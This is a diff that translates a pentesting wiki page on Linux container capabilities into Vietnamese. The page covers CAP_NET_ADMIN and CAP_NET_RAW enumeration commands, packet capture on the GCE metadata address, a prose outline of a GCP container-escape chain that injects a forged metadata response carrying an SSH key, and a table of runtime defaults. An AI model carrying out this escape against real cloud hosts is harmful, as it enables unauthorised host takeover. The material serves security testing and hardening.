+### `CAP_NET_ADMIN` và `CAP_NET_RAW`: các đường truy cập mạng của host
 
-`CAP_NET_ADMIN` affects only the current network namespace.
+`CAP_NET_ADMIN` chỉ ảnh hưởng đến network namespace hiện tại.
 
-**Check the capabilities and confinement:**
+**Kiểm tra các capability và mức độ cô lập:**
 
 ```bash
 capsh --print | grep -E 'cap_net_admin|cap_net_raw'
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 ```
 
-**Enumerate the current network and confirm host networking from the workload configuration:**
+**Liệt kê mạng hiện tại và xác nhận cấu hình mạng host từ cấu hình workload:**
 
 ```bash
 readlink /proc/self/ns/net
@@ -371,7 +371,7 @@ ip route
 nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
 ```
 
-**Exercise `CAP_NET_ADMIN` reversibly:** with host networking, the temporary interface is a node interface.
+**Thử nghiệm `CAP_NET_ADMIN` theo cách có thể đảo ngược:** khi dùng host networking, interface tạm thời là interface của node.
 
 ```bash
 ip link add ht-net-admin-proof type dummy
@@ -381,50 +381,49 @@ ip -brief addr show ht-net-admin-proof
 ip link delete ht-net-admin-proof
 ```
 
-`CAP_NET_RAW` permits RAW and PACKET sockets but is not a generic host shell. To **enumerate** the documented GCE chain, check the metadata route and capture whether plaintext guest-agent traffic is observable:
+`CAP_NET_RAW` cho phép tạo socket RAW và PACKET nhưng không phải là shell host đa dụng. Để **liệt kê** chuỗi GCE đã được ghi nhận, hãy kiểm tra route metadata và ghi nhận liệu lưu lượng guest-agent dạng plaintext có thể quan sát được hay không:
 
 ```bash
 ip route get 169.254.169.254
 tcpdump -ni any -c 20 'host 169.254.169.254'
 ```
 
-If the matching prerequisites exist, **exploit** the environment-specific chain as documented in [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): capture the request and sequence state, inject the forged metadata response containing an SSH key, then validate host access. The chain required root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext GCE metadata traffic, and a raceable guest-agent request; modern transport or agent behavior can break it.
+Nếu có đủ các điều kiện tiên quyết tương ứng, **exploit** chuỗi tấn công đặc thù môi trường như được mô tả trong [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): ghi lại request và trạng thái sequence, chèn phản hồi metadata giả mạo có chứa SSH key, sau đó xác minh quyền truy cập host. Chuỗi này yêu cầu quyền root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, lưu lượng metadata GCE ở dạng plaintext và request từ guest agent có thể khai thác race condition; hành vi của transport hoặc agent hiện đại có thể khiến chuỗi này không hoạt động.
 
 ## Checks
 
-The goal of the capability checks is not only to dump raw values but to understand whether the process has enough privilege to make its current namespace and mount situation dangerous.
+Mục tiêu của các bước kiểm tra capability không chỉ là lấy các giá trị thô mà còn để xác định liệu process có đủ quyền khiến tình trạng namespace và mount hiện tại trở nên nguy hiểm hay không.
 
 ```bash
 capsh --print                    # Human-readable capability sets and securebits
 grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
 ```
 
-What is interesting here:
+Điều gì đáng chú ý ở đây:
 
-- `capsh --print` is the easiest way to spot high-risk capabilities such as `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, or `cap_sys_module`.
-- The `CapEff` line in `/proc/self/status` tells you what is actually effective now, not just what might be available in other sets.
-- A capability dump becomes much more important if the container also shares host PID, network, or user namespaces, or has writable host mounts.
+- `capsh --print` là cách dễ nhất để phát hiện các capability có rủi ro cao như `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` hoặc `cap_sys_module`.
+- Dòng `CapEff` trong `/proc/self/status` cho biết những gì đang thực sự có hiệu lực, chứ không chỉ những gì có thể có trong các tập khác.
+- Kết quả dump capability càng quan trọng nếu container cũng chia sẻ PID namespace, network namespace hoặc user namespace của host, hay có các mount host cho phép ghi.
 
-After collecting the raw capability information, the next step is interpretation. Ask whether the process is root, whether user namespaces are active, whether host namespaces are shared, whether seccomp is enforcing, and whether AppArmor or SELinux still restricts the process. A capability set by itself is only part of the story, but it is often the part that explains why one container breakout works and another fails with the same apparent starting point.
+Sau khi thu thập thông tin capability thô, bước tiếp theo là diễn giải. Hãy xem tiến trình có phải root không, user namespace có đang hoạt động không, các namespace của host có được chia sẻ không, seccomp có đang thực thi không, và AppArmor hoặc SELinux có tiếp tục hạn chế tiến trình không. Bản thân tập capability chỉ là một phần của bức tranh, nhưng thường là phần giải thích vì sao một container breakout thành công còn một container khác lại thất bại dù điểm khởi đầu có vẻ giống nhau.
 
-## Runtime Defaults
+## Mặc định của runtime
 
-| Runtime / platform | Default state | Default behavior | Common manual weakening |
+| Runtime / nền tảng | Trạng thái mặc định | Hành vi mặc định | Cách làm suy yếu phổ biến |
 | --- | --- | --- | --- |
-| Docker Engine | Reduced capability set by default | Docker keeps a default allowlist of capabilities and drops the rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
-| Podman | Reduced capability set by default | Podman containers are unprivileged by default and use a reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
-| Kubernetes | Inherits runtime defaults unless changed | If no `securityContext.capabilities` are specified, the container gets the default capability set from the runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
-| containerd / CRI-O under Kubernetes | Usually runtime default | The effective set depends on the runtime plus the Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |
+| Docker Engine | Mặc định dùng tập capability đã giảm | Docker giữ một allowlist mặc định gồm các capability và loại bỏ những capability còn lại | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
+| Podman | Mặc định dùng tập capability đã giảm | Container của Podman mặc định không có đặc quyền và sử dụng mô hình capability đã giảm | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
+| Kubernetes | Kế thừa mặc định của runtime trừ khi được thay đổi | Nếu không chỉ định `securityContext.capabilities`, container sẽ nhận tập capability mặc định từ runtime | `securityContext.capabilities.add`, không đặt `drop: [\"ALL\"]`, `privileged: true` |
+| containerd / CRI-O trên Kubernetes | Thường là mặc định của runtime | Tập có hiệu lực phụ thuộc vào runtime cùng với cấu hình Pod | Như dòng Kubernetes; cấu hình OCI/CRI trực tiếp cũng có thể thêm capability một cách tường minh |
 
-For Kubernetes, the important point is that the API does not define one universal default capability set. If the Pod does not add or drop capabilities, the workload inherits the runtime default for that node.
+Đối với Kubernetes, điểm quan trọng là API không xác định một tập capability mặc định chung cho mọi trường hợp. Nếu Pod không thêm hoặc loại bỏ capability, workload sẽ kế thừa mặc định của runtime trên node đó.
 
 ## References
 
-- [1] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
-- [2] [Open Container Initiative - Linux container configuration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
-- [3] [Docker Docs - Runtime privilege and Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
-- [4] [Kubernetes Documentation - Set capabilities for a container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
-- [5] [Podman documentation - `--cap-add` and `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
-- [6] [Incus documentation - Security](https://linuxcontainers.org/incus/docs/main/explanation/security/)
-
+- [1] [capabilities(7) - trang hướng dẫn Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+- [2] [Open Container Initiative - cấu hình container Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
+- [3] [Tài liệu Docker - Quyền runtime và Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
+- [4] [Tài liệu Kubernetes - Đặt capabilities cho container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
+- [5] [Tài liệu Podman - `--cap-add` và `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
+- [6] [Tài liệu Incus - Bảo mật](https://linuxcontainers.org/incus/docs/main/explanation/security/)
 {{#include ../../../../banners/hacktricks-training.md}}
